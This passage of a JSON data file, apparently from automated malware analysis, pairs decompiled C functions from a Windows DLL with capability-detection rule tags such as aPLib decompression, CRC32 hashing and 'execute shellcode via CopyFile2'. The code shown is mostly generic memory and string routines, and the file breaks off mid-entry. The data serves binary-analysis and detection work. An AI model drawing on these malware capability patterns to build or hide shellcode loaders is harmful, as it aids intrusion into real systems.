        "decompiled_code": "\nvoid fcn.180064590(int64_t *arg1, uint64_t arg2)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ulong *puVar8;\n    uint64_t arg1_00;\n    uint *arg1_01;\n    uint64_t uVar9;\n    ulong *puVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    uint *puVar13;\n    uint64_t arg1_02;\n    \n    if (0x3ffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    arg1_00 = arg1[2] - *arg1 >> 6;\n    iVar12 = arg1[1] - *arg1 >> 6;\n    uVar6 = arg2;\n    if ((arg1_00 <= 0x3ffffffffffffff - (arg1_00 >> 1)) && (uVar6 = (arg1_00 >> 1) + arg1_00,  uVar6 < arg2)) {\n        uVar6 = arg2;\n    }\n    puVar11 = NULL;\n    arg1_02 = uVar6 * 0x40;\n    uVar9 = 0xffffffffffffffff;\n    if ((uVar6 < 0x400000000000000) && (uVar9 = arg1_02,  arg1_02 < 0x1000)) {\n        if (arg1_02 != 0) {\n            puVar11 = fcn.18008fb2c(arg1_02);\n            arg1_00 = arg1_02;\n        }\n    }\n    else {\n        arg1_00 = uVar9 + 0x27;\n        if (uVar9 + 0x27 <= uVar9) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        iVar7 = fcn.18008fb2c(arg1_00);\n        if (iVar7 == 0) goto code_r0x000180064779;\n        puVar11 = iVar7 + 0x27U & 0xffffffffffffffe0;\n        *(puVar11 + -2) = iVar7;\n    }\n    fcn.1800642f0(arg1_00, puVar11 + iVar12 * 0x10, arg2 - iVar12);\n    puVar1 = arg1[1];\n    puVar13 = *arg1;\n    arg1_01 = puVar11;\n    if (puVar13 != puVar1) {\n        puVar8 = puVar13 + 0xe;\n        puVar10 = puVar11 + 0xe;\n        do {\n            puVar10[-5] = 0;\n            puVar10[-4] = 0;\n            uVar3 = puVar13[1];\n            uVar4 = puVar13[2];\n            uVar5 = puVar13[3];\n            *arg1_01 = *puVar13;\n            arg1_01[1] = uVar3;\n            arg1_01[2] = uVar4;\n            arg1_01[3] = uVar5;\n            uVar3 = puVar13[5];\n            uVar4 = puVar13[6];\n            uVar5 = puVar13[7];\n            arg1_01[4] = puVar13[4];\n            arg1_01[5] = uVar3;\n            arg1_01[6] = uVar4;\n            arg1_01[7] = uVar5;\n            puVar8[-5] = 0;\n            arg1_01 = arg1_01 + 0x10;\n            puVar8[-4] = 0xf;\n            *puVar13 = 0;\n            puVar13 = puVar13 + 0x10;\n            puVar10[-1] = 0;\n            *puVar10 = 0;\n            uVar3 = *(puVar8 + -0x14);\n            uVar4 = *(puVar8 + -2);\n            uVar5 = *(puVar8 + -0xc);\n            *(puVar10 + -3) = *(puVar8 + -3);\n            *(puVar10 + -0x14) = uVar3;\n            *(puVar10 + -2) = uVar4;\n            *(puVar10 + -0xc) = uVar5;\n            uVar3 = *(puVar8 + -4);\n            uVar4 = *puVar8;\n            uVar5 = *(puVar8 + 4);\n            *(puVar10 + -1) = *(puVar8 + -1);\n            *(puVar10 + -4) = uVar3;\n            *puVar10 = uVar4;\n            *(puVar10 + 4) = uVar5;\n            puVar8[-1] = 0;\n            *puVar8 = 7;\n            *(puVar8 + -3) = 0;\n            puVar8 = puVar8 + 8;\n            puVar10 = puVar10 + 8;\n        } while (puVar13 != puVar1);\n    }\n    fcn.180064010(arg1_01, arg1_01);\n    if (*arg1 != 0) {\n        fcn.180064010(*arg1, arg1[1]);\n        iVar12 = *arg1;\n        iVar7 = iVar12;\n        if ((0xfff < (arg1[2] - iVar12 & 0xffffffffffffffc0U)) &&\n           (iVar7 = *(iVar12 + -8),  0x1f < (iVar12 - iVar7) - 8U)) {\ncode_r0x000180064779:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = puVar11;\n    arg1[1] = puVar11 + arg2 * 0x10;\n    arg1[2] = puVar11 + uVar6 * 0x10;\n    return;\n}\n",
        "token_count": 1392
    },
    "18006478": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180064780(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    uint *puVar9;\n    uint *arg1_00;\n    int64_t iVar10;\n    uint *puVar11;\n    uint64_t uVar12;\n    \n    if (0x7ffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar8 = arg1[2] - *arg1 >> 5;\n    iVar10 = arg1[1] - *arg1 >> 5;\n    uVar5 = arg2;\n    if ((uVar8 <= 0x7ffffffffffffff - (uVar8 >> 1)) && (uVar5 = (uVar8 >> 1) + uVar8,  uVar5 < arg2)) {\n        uVar5 = arg2;\n    }\n    puVar11 = NULL;\n    uVar12 = uVar5 * 0x20;\n    uVar8 = 0xffffffffffffffff;\n    if ((uVar5 < 0x800000000000000) && (uVar8 = uVar12,  uVar12 < 0x1000)) {\n        if (uVar12 != 0) {\n            puVar11 = fcn.18008fb2c(uVar12);\n        }\n    }\n    else {\n        uVar12 = uVar8 + 0x27;\n        if (uVar8 + 0x27 <= uVar8) {\n            uVar12 = 0xffffffffffffffff;\n        }\n        iVar6 = fcn.18008fb2c(uVar12);\n        if (iVar6 == 0) goto code_r0x000180064948;\n        puVar11 = iVar6 + 0x27U & 0xffffffffffffffe0;\n        *(puVar11 + -2) = iVar6;\n    }\n    puVar9 = puVar11 + iVar10 * 8;\n    for (iVar10 = arg2 - iVar10; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *(puVar9 + 4) = 0;\n        *(puVar9 + 6) = 7;\n        *puVar9 = 0;\n        puVar9 = puVar9 + 8;\n    }\n    fcn.180013aa0(puVar9, puVar9);\n    puVar9 = arg1[1];\n    arg1_00 = puVar11;\n    for (puVar7 = *arg1; puVar7 != puVar9; puVar7 = puVar7 + 8) {\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 6) = 0;\n        uVar2 = puVar7[1];\n        uVar3 = puVar7[2];\n        uVar4 = puVar7[3];\n        *arg1_00 = *puVar7;\n        arg1_00[1] = uVar2;\n        arg1_00[2] = uVar3;\n        arg1_00[3] = uVar4;\n        uVar2 = puVar7[5];\n        uVar3 = puVar7[6];\n        uVar4 = puVar7[7];\n        arg1_00[4] = puVar7[4];\n        arg1_00[5] = uVar2;\n        arg1_00[6] = uVar3;\n        arg1_00[7] = uVar4;\n        *(puVar7 + 4) = 0;\n        arg1_00 = arg1_00 + 8;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n    }\n    fcn.180013aa0(arg1_00, arg1_00);\n    if (*arg1 != 0) {\n        fcn.180013aa0(*arg1, arg1[1]);\n        iVar10 = *arg1;\n        iVar6 = iVar10;\n        if ((0xfff < (arg1[2] - iVar10 & 0xffffffffffffffe0U)) &&\n           (iVar6 = *(iVar10 + -8),  0x1f < (iVar10 - iVar6) - 8U)) {\ncode_r0x000180064948:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar6);\n    }\n    *arg1 = puVar11;\n    arg1[1] = puVar11 + arg2 * 8;\n    arg1[2] = puVar11 + uVar5 * 8;\n    return;\n}\n",
        "token_count": 1107
    },
    "18006495": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180064950(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t arg1_00;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    if (0x3fffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar3 = arg1[2] - *arg1 >> 2;\n    iVar6 = arg1[1] - *arg1 >> 2;\n    uVar5 = arg2;\n    if ((uVar3 <= 0x3fffffffffffffff - (uVar3 >> 1)) && (uVar5 = (uVar3 >> 1) + uVar3,  uVar5 < arg2)) {\n        uVar5 = arg2;\n    }\n    uVar3 = uVar5 * 4;\n    if (uVar5 < 0x4000000000000000) {\n        uVar5 = uVar3;\n        if (0xfff < uVar3) goto code_r0x0001800649db;\n        if (uVar3 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar3);\n        }\n    }\n    else {\n        uVar5 = 0xffffffffffffffff;\ncode_r0x0001800649db:\n        uVar4 = uVar5 + 0x27;\n        if (uVar4 <= uVar5) {\n            uVar4 = 0xffffffffffffffff;\n        }\n        iVar2 = fcn.18008fb2c(uVar4);\n        if (iVar2 == 0) goto code_r0x000180064aa5;\n        uVar5 = iVar2 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar2;\n    }\n    fcn.1800ae290(uVar5 + iVar6 * 4, 0, (arg2 - iVar6) * 4);\n    fcn.1800ade80(uVar5, *arg1, arg1[1] - *arg1);\n    uVar4 = *arg1;\n    if (uVar4 != 0) {\n        arg1_00 = uVar4;\n        if ((0xfff < (arg1[2] - uVar4 & 0xfffffffffffffffc)) && (arg1_00 = *(uVar4 - 8),  0x1f < (uVar4 - arg1_00) - 8))\n        {\ncode_r0x000180064aa5:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg1 = uVar5;\n    arg1[1] = uVar5 + arg2 * 4;\n    arg1[2] = uVar3 + uVar5;\n    return;\n}\n",
        "token_count": 710
    },
    "1800755c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.1800755c4(uint *arg1, uint64_t arg2, uint64_t arg3, uint *arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    \n    uVar5 = 0;\n    uVar4 = (arg3 - arg2) + 1 >> 1;\n    if (arg3 < arg2) {\n        uVar4 = uVar5;\n    }\n    if (uVar4 != 0) {\n        do {\n            fcn.180078370(arg4);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 != uVar4);\n    }\n    uVar1 = arg4[1];\n    uVar2 = arg4[2];\n    uVar3 = arg4[3];\n    *arg1 = *arg4;\n    arg1[1] = uVar1;\n    arg1[2] = uVar2;\n    arg1[3] = uVar3;\n    return arg1;\n}\n",
        "token_count": 245
    },
    "180075e8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180075e8c(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t arg1_00;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t arg1_01;\n    uint64_t uVar7;\n    \n    if (0x7ffffffffffffffe < arg2) {\n        fcn.180014b60();\n        pcVar4 = swi(3);\n        piVar5 = (*pcVar4)();\n        return piVar5;\n    }\n    uVar2 = arg1[3];\n    uVar6 = arg2 | 7;\n    uVar7 = 0x7ffffffffffffffe;\n    if (((uVar6 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar7 = uVar6,  uVar6 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    arg1_00 = fcn.180082b64(arg1, uVar7 + 1, noname_2, arg4);\n    arg1[3] = uVar7;\n    arg1[2] = arg2;\n    fcn.1800ade80(arg1_00, arg4, arg2 * 2);\n    *(arg2 * 2 + arg1_00) = 0;\n    if (7 < uVar2) {\n        iVar3 = *arg1;\n        arg1_01 = iVar3;\n        if (0xfff < uVar2 * 2 + 2) {\n            arg1_01 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_01) - 8U) {\n                fcn.1800b3528(iVar3 - arg1_01, uVar2 * 2 + 0x29);\n                pcVar4 = swi(3);\n                piVar5 = (*pcVar4)();\n                return piVar5;\n            }\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 544
    },
    "180075f8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180075f80(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    ushort *extraout_RAX;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t arg1_00;\n    ushort *puVar8;\n    ulong in_R8;\n    ushort in_R9W;\n    unkbyte6 in_R9;\n    \n    if (0x7ffffffffffffffe < arg2) {\n        fcn.180014b60();\n        pcVar4 = swi(3);\n        piVar5 = (*pcVar4)();\n        return piVar5;\n    }\n    uVar2 = arg1[3];\n    uVar6 = arg2 | 7;\n    uVar7 = 0x7ffffffffffffffe;\n    if (((uVar6 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar7 = uVar6,  uVar6 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    fcn.180082b64(arg1, uVar7 + 1, in_R8, CONCAT62(in_R9, in_R9W));\n    arg1[2] = arg2;\n    arg1[3] = uVar7;\n    uVar7 = arg2;\n    puVar8 = extraout_RAX;\n    if (arg2 != 0) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar8 = in_R9W;\n            puVar8 = puVar8 + 1;\n        }\n    }\n    extraout_RAX[arg2] = 0;\n    if (7 < uVar2) {\n        iVar3 = *arg1;\n        arg1_00 = iVar3;\n        if (0xfff < uVar2 * 2 + 2) {\n            arg1_00 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar3 - arg1_00, uVar2 * 2 + 0x29);\n                pcVar4 = swi(3);\n                piVar5 = (*pcVar4)();\n                return piVar5;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg1 = extraout_RAX;\n    return arg1;\n}\n",
        "token_count": 612
    },
    "18007607": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180076074(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    int64_t arg1_00;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    ulong in_R8;\n    ushort in_R9W;\n    unkbyte6 in_R9;\n    \n    iVar2 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar2 < arg2) {\n        fcn.180014b60();\n        pcVar4 = swi(3);\n        piVar5 = (*pcVar4)();\n        return piVar5;\n    }\n    uVar3 = arg1[3];\n    uVar6 = iVar2 + arg2 | 7;\n    uVar7 = 0x7ffffffffffffffe;\n    if (((uVar6 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) &&\n       (uVar1 = (uVar3 >> 1) + uVar3,  uVar7 = uVar6,  uVar6 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    fcn.180082b64(arg1, uVar7 + 1, in_R8, CONCAT62(in_R9, in_R9W));\n    iVar8 = iVar2 * 2;\n    arg1[2] = iVar2 + arg2;\n    arg1[3] = uVar7;\n    if (uVar3 < 8) {\n        fcn.1800ade80(arg1_00, arg1, iVar8);\n        *(iVar8 + arg1_00) = in_R9W;\n        *(iVar8 + 2 + arg1_00) = 0;\n    }\n    else {\n        iVar2 = *arg1;\n        fcn.1800ade80(arg1_00, iVar2, iVar8);\n        *(iVar8 + arg1_00) = in_R9W;\n        *(iVar8 + 2 + arg1_00) = 0;\n        iVar8 = iVar2;\n        if (0xfff < uVar3 * 2 + 2) {\n            iVar8 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar8) - 8U) {\n                fcn.1800b3528(iVar8, uVar3 * 2 + 0x29);\n                pcVar4 = swi(3);\n                piVar5 = (*pcVar4)();\n                return piVar5;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 641
    },
    "1800761a": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.1800761a0(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg3;\n    code *pcVar3;\n    int64_t arg2_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uchar auStackX24 [16];\n    \n    iVar7 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar7 < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = iVar7 + arg2 | 7;\n    uVar6 = 0x7ffffffffffffffe;\n    if (((uVar5 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar6 = uVar5,  uVar5 < uVar1)) {\n        uVar6 = uVar1;\n    }\n    arg2_00 = fcn.180011cf0(arg1, uVar6 + 1);\n    arg1[2] = iVar7 + arg2;\n    arg1[3] = uVar6;\n    if (uVar2 < 8) {\n        fcn.18007844c(auStackX24, arg2_00, arg1, iVar7);\n    }\n    else {\n        arg3 = *arg1;\n        fcn.18007844c(auStackX24, arg2_00, arg3, iVar7);\n        iVar7 = arg3;\n        if (0xfff < uVar2 * 2 + 2) {\n            iVar7 = *(arg3 + -8);\n            if (0x1f < (arg3 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg2_00;\n    return arg1;\n}\n",
        "token_count": 567
    },
    "1800762e": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.1800762ec(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg2_00;\n    code *pcVar3;\n    int64_t arg3;\n    int64_t arg1_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int64_t in_stack_00000028;\n    \n    iVar7 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar7 < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = iVar7 + arg2 | 7;\n    uVar6 = 0x7ffffffffffffffe;\n    if (((uVar5 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar6 = uVar5,  uVar5 < uVar1)) {\n        uVar6 = uVar1;\n    }\n    arg1_00 = fcn.180082b64(arg1, uVar6 + 1, noname_2, arg4);\n    arg3 = iVar7 * 2;\n    arg1[2] = iVar7 + arg2;\n    arg1[3] = uVar6;\n    if (uVar2 < 8) {\n        fcn.1800ade80(arg1_00, arg1, arg3);\n        fcn.1800ade80(arg3 + arg1_00, arg4, in_stack_00000028 * 2);\n        *(arg1_00 + (iVar7 + in_stack_00000028) * 2) = 0;\n    }\n    else {\n        arg2_00 = *arg1;\n        fcn.1800ade80(arg1_00, arg2_00, arg3);\n        fcn.1800ade80(arg3 + arg1_00, arg4, in_stack_00000028 * 2);\n        *(arg1_00 + (iVar7 + in_stack_00000028) * 2) = 0;\n        iVar7 = arg2_00;\n        if (0xfff < uVar2 * 2 + 2) {\n            iVar7 = *(arg2_00 + -8);\n            if (0x1f < (arg2_00 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 703
    },
    "18007643": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180076434(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg3;\n    code *pcVar3;\n    int64_t arg2_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uchar auStackX24 [16];\n    \n    iVar7 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar7 < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = iVar7 + arg2 | 7;\n    uVar6 = 0x7ffffffffffffffe;\n    if (((uVar5 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar6 = uVar5,  uVar5 < uVar1)) {\n        uVar6 = uVar1;\n    }\n    arg2_00 = fcn.180082b64(arg1, uVar6 + 1, noname_2, arg4);\n    arg1[2] = iVar7 + arg2;\n    arg1[3] = uVar6;\n    if (uVar2 < 8) {\n        fcn.18007844c(auStackX24, arg2_00, arg1, iVar7);\n    }\n    else {\n        arg3 = *arg1;\n        fcn.18007844c(auStackX24, arg2_00, arg3, iVar7);\n        iVar7 = arg3;\n        if (0xfff < uVar2 * 2 + 2) {\n            iVar7 = *(arg3 + -8);\n            if (0x1f < (arg3 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg2_00;\n    return arg1;\n}\n",
        "token_count": 573
    },
    "18007658": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180076580(int64_t *arg1, uint64_t arg2, ulong noname_2, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg2_00;\n    code *pcVar3;\n    int64_t arg1_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ushort *puVar9;\n    ushort in_stack_00000028;\n    \n    iVar7 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar7 < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = iVar7 + arg2 | 7;\n    uVar8 = 0x7ffffffffffffffe;\n    if (((uVar5 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar8 = uVar5,  uVar5 < uVar1)) {\n        uVar8 = uVar1;\n    }\n    arg1_00 = fcn.180082b64(arg1, uVar8 + 1, noname_2, arg4);\n    arg1[3] = uVar8;\n    iVar6 = iVar7 * 2;\n    arg1[2] = iVar7 + arg2;\n    puVar9 = iVar6 + arg1_00;\n    if (uVar2 < 8) {\n        fcn.1800ade80(arg1_00, arg1, iVar6);\n        iVar6 = arg4;\n        if (arg4 != 0) {\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = in_stack_00000028;\n                puVar9 = puVar9 + 1;\n            }\n        }\n        *(arg1_00 + (iVar7 + arg4) * 2) = 0;\n    }\n    else {\n        arg2_00 = *arg1;\n        fcn.1800ade80(arg1_00, arg2_00, iVar6);\n        iVar6 = arg4;\n        if (arg4 != 0) {\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = in_stack_00000028;\n                puVar9 = puVar9 + 1;\n            }\n        }\n        *(arg1_00 + (iVar7 + arg4) * 2) = 0;\n        iVar7 = arg2_00;\n        if (0xfff < uVar2 * 2 + 2) {\n            iVar7 = *(arg2_00 + -8);\n            if (0x1f < (arg2_00 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 786
    },
    "18000538": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180005380(ulong noname_0, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    code *pcVar1;\n    ulong arg1;\n    uchar *arg1_00;\n    int64_t iVar2;\n    int64_t arg1_01;\n    ulong *arg3_00;\n    int64_t *in_stack_00000028;\n    uchar auStack312 [32];\n    ulong uStack280;\n    ulong uStack264;\n    uchar *puStack256;\n    int64_t aiStack248 [3];\n    uint64_t uStack224;\n    uchar auStack216 [32];\n    uchar auStack184 [136];\n    uint64_t uStack48;\n    \n    uStack264 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack312;\n    puStack256 = auStack216;\n    uStack280 = fcn.18000de50(auStack216, in_stack_00000028);\n    arg1 = fcn.1800687b0(auStack184);\n    arg3_00 = arg4;\n    if (7 < arg4[3]) {\n        arg3_00 = *arg4;\n    }\n    fcn.180068c50(arg1, aiStack248, arg3_00, arg3_00 + arg4[2] * 2);\n    arg1_00 = auStack184;\n    fcn.1800686c0(arg1_00);\n    fcn.180005260(arg1_00, arg2, arg3, aiStack248);\n    if (0xf < uStack224) {\n        iVar2 = aiStack248[0];\n        if (0xfff < uStack224 + 1) {\n            iVar2 = *(aiStack248[0] + -8);\n            if (0x1f < (aiStack248[0] - iVar2) - 8U) {\n                fcn.1800b3528(iVar2, uStack224 + 0x28);\n                goto code_r0x0001800054d8;\n            }\n        }\n        fcn.18008fb24(iVar2);\n    }\n    if (0xf < in_stack_00000028[3]) {\n        iVar2 = *in_stack_00000028;\n        arg1_01 = iVar2;\n        if ((0xfff < in_stack_00000028[3] + 1U) && (arg1_01 = *(iVar2 + -8),  0x1f < (iVar2 - arg1_01) - 8U)) {\ncode_r0x0001800054d8:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    in_stack_00000028[2] = 0;\n    in_stack_00000028[3] = 0xf;\n    *in_stack_00000028 = 0;\n    fcn.18008fb00(uStack48 ^ auStack312);\n    return;\n}\n",
        "token_count": 683
    },
    "18000b17": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18000b170(ulong noname_0, ulong *arg2, int64_t *arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong *****pppppuVar3;\n    int64_t arg1;\n    ulong uVar4;\n    ulong *arg3_00;\n    ulong in_R9;\n    uchar auStack536 [48];\n    ulong uStack488;\n    uchar auStack472 [128];\n    int64_t *piStack344;\n    int32_t iStack332;\n    code *pcStack328;\n    uchar auStack320 [8];\n    uint8_t auStack312 [152];\n    code *apcStack160 [13];\n    ulong *****apppppuStack56 [2];\n    ulong uStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack488 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack536;\n    uVar4 = 0x108;\n    piStack344 = arg3;\n    fcn.1800ae290(&pcStack328, 0, 0x108);\n    fcn.18000f150(&pcStack328, arg3, uVar4, in_R9);\n    if ((auStack312[*(pcStack328 + 4)] & 6) == 0) {\n        uVar4 = fcn.1800687b0(auStack472);\n        arg3_00 = arg2;\n        if (7 < arg2[3]) {\n            arg3_00 = *arg2;\n        }\n        fcn.180068c50(uVar4, apppppuStack56, arg3_00, arg3_00 + arg2[2] * 2);\n        fcn.1800686c0(auStack472);\n        pppppuVar3 = apppppuStack56;\n        if (0xf < 